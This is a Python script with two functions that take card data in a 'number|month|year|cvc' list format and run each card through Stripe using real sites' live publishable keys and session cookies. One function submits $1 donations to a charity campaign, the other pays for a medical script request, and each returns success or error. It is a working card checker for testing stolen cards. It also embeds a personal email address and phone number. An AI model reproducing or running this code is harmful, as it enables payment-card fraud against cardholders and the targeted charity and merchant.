import requests,re
def Tele(ccx):
	import requests
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	r = requests.session()
	time.sleep(20)


	headers = {
            'authority': 'api.stripe.com',
            'accept': 'application/json',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/',
            'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
	}

	data = f'type=card&billing_details[name]=Hy&billing_details[email]=saimyataungcr8%40gmail.com&billing_details[address][city]=New+York+&billing_details[address][country]=US&billing_details[address][line1]=New+York&billing_details[address][line2]=Hhh&billing_details[address][postal_code]=10080&billing_details[address][state]=New+York&billing_details[phone]=15025659429&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=51793cd0-b6db-4ea6-aaee-ede1ac021a299e6275&muid=7d5426db-2192-4323-9eeb-146aa8676b4d905708&sid=3c8d02d7-7363-4bad-969c-4d15f7d33e9bf74ade&pasted_fields=number&payment_user_agent=stripe.js%2F803162f903%3B+stripe-js-v3%2F803162f903%3B+card-element&referrer=https%3A%2F%2Fneedhelped.com&time_on_page=53559&key=pk_live_51NKtwILNTDFOlDwVRB3lpHRqBTXxbtZln3LM6TrNdKCYRmUuui6QwNFhDXwjF1FWDhr5BfsPvoCbAKlyP6Hv7ZIz00yKzos8Lr'
	r1 = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)

	pm = r1.json()['id']


	cookies = {
            '_ga': 'GA1.1.1027315439.1730043864',
            'charitable_session': 'aef110cc4f9105e7ed853b595426a622||86400||82800',
            '__stripe_mid': '7d5426db-2192-4323-9eeb-146aa8676b4d905708',
            '__stripe_sid': '3c8d02d7-7363-4bad-969c-4d15f7d33e9bf74ade',
            '_ga_M3WG7TPY0P': 'GS1.1.1730043864.1.1.1730044001.0.0.0',
            '_ga_9S894YGECP': 'GS1.1.1730043863.1.1.1730044004.0.0.0',
	}

	headers = {
            'authority': 'needhelped.com',
            'accept': 'application/json, text/javascript, */*; q=0.01',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            # 'cookie': '_ga=GA1.1.1027315439.1730043864; charitable_session=aef110cc4f9105e7ed853b595426a622||86400||82800; __stripe_mid=7d5426db-2192-4323-9eeb-146aa8676b4d905708; __stripe_sid=3c8d02d7-7363-4bad-969c-4d15f7d33e9bf74ade; _ga_M3WG7TPY0P=GS1.1.1730043864.1.1.1730044001.0.0.0; _ga_9S894YGECP=GS1.1.1730043863.1.1.1730044004.0.0.0',
            'origin': 'https://needhelped.com',
            'referer': 'https://needhelped.com/campaigns/christmas-poor-family-need-help-for-mother-teresas-charity/donate/',
            'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
            'x-requested-with': 'XMLHttpRequest',
	}


	data = {
            'charitable_form_id': '671e606084fc2',
            '671e606084fc2': '',
            '_charitable_donation_nonce': '7879bdccbb',
            '_wp_http_referer': '/campaigns/christmas-poor-family-need-help-for-mother-teresas-charity/donate/',
            'campaign_id': '1163',
            'description': 'Christmas: Poor Family Need Help for Mother Teresa’s charity',
            'ID': '0',
            'donation_amount': 'custom',
            'custom_donation_amount': '1.00',
            'first_name': 'Chit',
            'last_name': 'Nge',
            'email': 'saimyataungcr8@gmail.com',
            'address': 'New York',
            'address_2': 'Hhh',
            'city': 'New York ',
            'state': 'New York',
            'postcode': '10080',
            'country': 'US',
            'phone': '15025659429',
            'gateway': 'stripe',
            'stripe_payment_method': pm,
            'action': 'make_donation',
            'form_action': 'make_donation',
	}
	
	r2 = requests.post(
			'https://needhelped.com/wp-admin/admin-ajax.php',
			cookies=cookies,
			headers=headers,
			data=data,
	).json()
	try:
		ii=r2['errors']
	except:
		return 'success' or 'Thank You'
	return ii

import requests,re
def Tele2(ccx):
	import requests
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	r = requests.session()


	headers = {
			'authority': 'api.stripe.com',
			'accept': 'application/json',
			'accept-language': 'en-US,en;q=0.9',
			'content-type': 'application/x-www-form-urlencoded',
			'origin': 'https://js.stripe.com',
			'referer': 'https://js.stripe.com/',
			'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
			'sec-ch-ua-mobile': '?1',
			'sec-ch-ua-platform': '"Android"',
			'sec-fetch-dest': 'empty',
			'sec-fetch-mode': 'cors',
			'sec-fetch-site': 'same-site',
			'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
	}

	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&key=pk_live_51Q9zOoP8CnXsumqaMSligBEuHCOTbbw06EdZ8p0Yvr64Pgi7jDwI8IzHSZZWrsj0atvhQfrCDFuYWslVhgqJWSyH006EBFpwtZ'
	r1 = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)

	pm = r1.json()['id']


	cookies = {
            '__stripe_mid': '3d85359e-8d75-414e-9b44-1b5c4412a86152dadf',
            '__stripe_sid': 'e9dcd3cd-c9f0-4b99-af1b-0f7bb66a624748b1cb',
	}

	headers = {
            'authority': 'g-pg.com.au',
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            # 'cookie': '__stripe_mid=3d85359e-8d75-414e-9b44-1b5c4412a86152dadf; __stripe_sid=e9dcd3cd-c9f0-4b99-af1b-0f7bb66a624748b1cb',
            'origin': 'https://g-pg.com.au',
            'referer': 'https://g-pg.com.au/welcome/repeat-script-requests',
            'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
            'x-requested-with': 'XMLHttpRequest',
	}

	params = {
			't': '1729922956202',
	}

	data = {
            'data': '__fluent_form_embded_post_id=1138&_fluentform_5_fluentformnonce=a397b837fc&_wp_http_referer=%2Fwelcome%2Frepeat-script-requests&names%5Bfirst_name%5D=Chit&names%5Blast_name%5D=Nge&datetime=21%2F10%2F2000&names_1%5Bfirst_name%5D=Chit&names_1%5Blast_name%5D=Nge&input_text=Tgg&address_1%5Baddress_line_1%5D=New%20York&address_1%5Bcity%5D=New%20York%20&address_1%5Bstate%5D=New%20York&address_1%5Bzip%5D=10080&numeric-field=1502565942&email=saimyataungcr8%40gmail.com&dropdown=Dr%20Jo%20Centra&message=Cc&datetime_2=03%2F10%2F2024&message_1=Cc&datetime_1=31%2F10%2F2024&payment_input=Standard%20Script%20Request&payment_method=stripe&__stripe_payment_method_id='+str(pm)+'',
            'action': 'fluentform_submit',
            'form_id': '5',
	}
	
	r2 = requests.post(
			'https://g-pg.com.au/wp-admin/admin-ajax.php',
			params=params,
			cookies=cookies,
			headers=headers,
			data=data,
	)
	return (r2.json())


	
	
